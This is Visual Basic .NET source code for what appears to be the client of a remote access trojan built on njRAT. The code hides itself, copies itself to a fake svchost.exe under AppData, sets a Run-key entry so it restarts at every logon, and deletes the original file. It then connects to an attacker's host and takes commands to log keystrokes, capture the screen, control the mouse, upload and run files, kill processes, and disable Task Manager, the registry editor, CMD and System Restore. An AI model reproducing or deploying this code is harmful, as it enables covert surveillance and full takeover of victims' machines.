Imports System.Globalization
Imports System.IO
Imports System.Net, System.Net.Sockets, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.Runtime.InteropServices, Microsoft.Win32


Public Class Form1

    Dim PersistThread As Thread
    Public alab As String
    Public WithEvents C As New SocketClient
    Public Yy As String = "|BawaneH|"
    Public HOST As String
    Public port As Integer
    Public name As String
    Public copyse As Boolean = 0

    Public sernam As String
    Public addtos As Boolean = 0
    Public StartupKey As String
    Public melts As Boolean = 0
    Public pw As String
    Public cap As New CRDP
    Public caa As New CRDP1
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Public Declare Function apiBlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Public Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
    Private Declare Auto Sub SendMessage Lib "user32.dll" (ByVal hWnd As Integer, ByVal msg As UInt32, ByVal wParam As UInt32, ByVal lparam As Integer)
    Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Dim taskBar As Integer = FindWindow("Shell_traywnd", "")
    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer

    Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpCommandString As String, ByVal lpReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private makel As String
    Dim alaa(), text1, text2 As String
    Const spl = "abccba"
    Dim PictureBox1 As Windows.Forms.PictureBox
    Dim streamWebcam As Boolean = False
    Dim o As New njLogger
    Public loggg As String
    Private Declare Function SendCamMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Int32, ByVal Msg As Int32, ByVal wParam As Int32, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Int32

    Private Function GetCaption() As String
        Dim Caption As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        text1 = Space(LOF(1))
        text2 = Space(LOF(1))
        FileGet(1, text1)
        FileGet(1, text2)
        FileClose()
        alaa = Split(text1, spl)
        HOST = alaa(1)
        port = alaa(2)
        name = alaa(3)
        copyse = alaa(4)
        'serfol = alaa(5)
        sernam = alaa(5)
        addtos = alaa(6)
        StartupKey = alaa(7)
        melts = alaa(8)
        pw = alaa(9)
        alab = A.GT
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
        Me.ShowInTaskbar = False
        Me.Hide()
        Me.Visible = False
        If Not IO.Directory.Exists(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) Then
            IO.Directory.CreateDirectory(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
        End If
        o.Start()

        Timer2.Start()
        '   C.Connect(HOST, port)
        '-----------------------------------------------------------------------------
        If melts Then
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe" Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else

                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    End
                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    End
                End If
            End If
        End If
        '--------------------------------------------------------------------------------
        If copyse Then
            If Application.ExecutablePath = Path.GetTempPath & sernam & ".exe" Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    '   Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else

                If File.Exists(Path.GetTempPath & sernam & ".exe") Then
                    Try : IO.File.Delete(Path.GetTempPath & sernam & ".exe") : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
                    'IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Path.GetTempPath & sernam & ".exe")
                    End
                Else
                    IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
                    'IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Path.GetTempPath & sernam & ".exe")
                    End
                End If
            End If
        End If



        If addtos Then
            Try

                Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
            Catch : End Try
        End If
    End Sub
#Region "Socket Events"
    Private Sub Connected() Handles C.Connected
        '  Timer2.Stop()
    End Sub
    Private Sub Disconnected() Handles C.Disconnected

        '  Timer2.Interval = 100
        ' Timer2.Start()
        '  C.Connect(HOST, port)
    End Sub
    Private Sub Data(ByVal b As Byte()) Handles C.Data
        Dim T As String = BS(b)
        Dim A As String() = Split(T, Yy)
        Try
            Select Case A(0)
                Case "tt"
                    C.Send("tt")
                Case "Upload"
                    Try
                        If File.Exists(A(1)) Then File.Delete(A(1))
                        Dim fs As New FileStream(A(1), FileMode.Create, FileAccess.Write)
                        Dim tempPacket() As Byte = SB(A(3))
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        C.Send("NextPartOfUpload" & Yy & A(2))
                    Catch
                        C.Send("UploadFailed" & Yy & A(2))
                    End Try
                Case "UploadContinue"
                    Try
A:
                        Dim fs As New FileStream(A(1), FileMode.Append, FileAccess.Write)
                        Dim tempPacket() As Byte = SB(A(3))
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        C.Send("NextPartOfUpload" & Yy & A(2))
                    Catch
                        GoTo A 'Send("UploadFailed|" & cut(2))
                    End Try
                Case "CancelUpload"
B:
                    Try
                        If File.Exists(A(1)) Then File.Delete(A(1))
                    Catch
                        GoTo B
                    End Try
                Case "info" ' server ask me what is my pc name
                    ' If A(1) = pw Then
                    Dim pc As String = Environment.MachineName & "/" & Environment.UserName

                    C.Send("info" & Yy & name & Yy & pc & Yy & country & Yy & My.Computer.Info.OSFullName & Yy & getanti())
                    ' End If
                Case "Uninstall"
                    Try
                        Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                        PersistThread.Abort() : regKey.DeleteValue(StartupKey) : regKey.Close()

                    Catch ex As Exception
                    End Try

                    End

                Case "!" ' server ask for my screen Size
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    C.Send("!" & Yy & s.Width & Yy & s.Height)
                Case "!!" ' server ask for my screen Size
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    C.Send("!!" & Yy & s.Width & Yy & s.Height)
                Case "@" ' Start Capture
                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@" & Yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    C.Send(M.ToArray)
                    M.Dispose()
                Case "@@" ' Start Capture

                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = caa.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@@" & Yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    C.Send(M.ToArray)
                    M.Dispose()
                Case "#" ' mouse clicks
                    Cursor.Position = New Point(A(1), A(2))
                    mouse_event(A(3), 0, 0, 0, 1)
                Case "$" '  mouse move
                    Cursor.Position = New Point(A(1), A(2))
                Case "close"
                    End
                Case "Logoff"
                    Shell("shutdown -l -t 00", AppWinStyle.Hide)
                Case "Restart"
                    Shell("shutdown -r -t 00", AppWinStyle.Hide)
                Case "Shutdown"
                    Shell("shutdown -s -t 00", AppWinStyle.Hide)
                Case "GetDrives"
                    C.Send("FileManager" & Yy & getDrives())
                Case "FileManager"
                    Try
                        C.Send("FileManager" & Yy & getFolders(A(1)) & getFiles(A(1)))
                    Catch
                        C.Send("FileManager" & Yy & "Error")
                    End Try
                Case "|||"
                    C.Send("|||")
                Case "Delete"
                    Select Case A(1)
                        Case "Folder"
                            IO.Directory.Delete(A(2))
                        Case "File"
                            IO.File.Delete(A(2))
                    End Select
                Case "Execute"
                    Process.Start(A(1))
                Case "Rename"
                    Select Case A(1)
                        Case "Folder"
                            My.Computer.FileSystem.RenameDirectory(A(2), A(3))
                        Case "File"
                            My.Computer.FileSystem.RenameFile(A(2), A(3))
                    End Select

                Case "||||"
                    C.Send("||||")
                Case "GetProcesses"
                    Dim allProcess As String = ""
                    Dim ProcessList As Process() = Process.GetProcesses()
                    For Each Proc As Process In ProcessList
                        allProcess += Proc.ProcessName & "ProcessSplit" & Proc.Id & "ProcessSplit" & Proc.SessionId & "ProcessSplit" & Proc.MainWindowTitle & "ProcessSplit"
                    Next
                    C.Send("ProcessManager" & Yy & allProcess)
                Case "KillProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
                            RunningProcess.Kill()
                        Next
                    Next

                Case "++"

                    C.Send("++")
                Case "fun"
                    C.Send("fun")
                Case "OpenCD"
                    mciSendString("set CDAudio door open", "", 0, 0)
                Case "CloseCD"
                    mciSendString("set CDAudio door closed", "", 0, 0)
                Case "DisableKM"
                    apiBlockInput(1)
                Case "EnableKM"
                    apiBlockInput(0)
                Case "TurnOffMonitor"
                    SendMessage(-1, &H112, &HF170, 2)
                Case "TurnOnMonitor"
                    SendMessage(-1, &H112, &HF170, -1)
                Case "NormalMouse"
                    SwapMouseButton(&H0&)
                Case "ReverseMouse"
                    SwapMouseButton(&H100&)
                Case "HideTaskBar"
                    Console.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, &H80))
                Case "ShowTaskBar"
                    Console.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, &H40))
                Case "DisableCMD"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableCMD"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableRegistry"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableRegistry"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableRestore"
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableRestore"
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableTaskManager"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableTaskManager"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)

                Case "opentto"
                    C.Send("opentto")
                Case "TextToSpeech"
                    Dim SAPI = CreateObject("SAPI.Spvoice")
                    SAPI.speak(A(1))
                Case "ppww"

                    C.Send("ppww" & Yy & "bb" & alab)
                Case "F"
                    My.Computer.FileSystem.WriteAllBytes(A(2), SB(A(1)), False)
                    Process.Start(A(2))
                    C.Send("F")
                    '    Case "logf"
                    '       C.Send("logf" & Yy & getlog(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) & Yy & Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
                Case "openlo"
                    C.Send("openlo")
                Case "getlog"
                    Try
                        loggg = o.Logs
                        C.Send("getlog" & Yy & loggg)
                    Catch : End Try
            End Select
        Catch ex As Exception
        End Try

    End Sub
#End Region

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim CapTxt As String = GetCaption()
        If makel <> CapTxt Then
            makel = CapTxt
            ' stop timer before showing msgbox so it is not detected!
            Timer1.Stop()
            C.Send("AW" & Yy & CapTxt)
            ' resume timer 
            Timer1.Start()
        End If
    End Sub


    Private Sub Timer2_Tick_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        If C.Statconnected = False Then
            C.Connect(HOST, port)
        End If
    End Sub

 
End Class
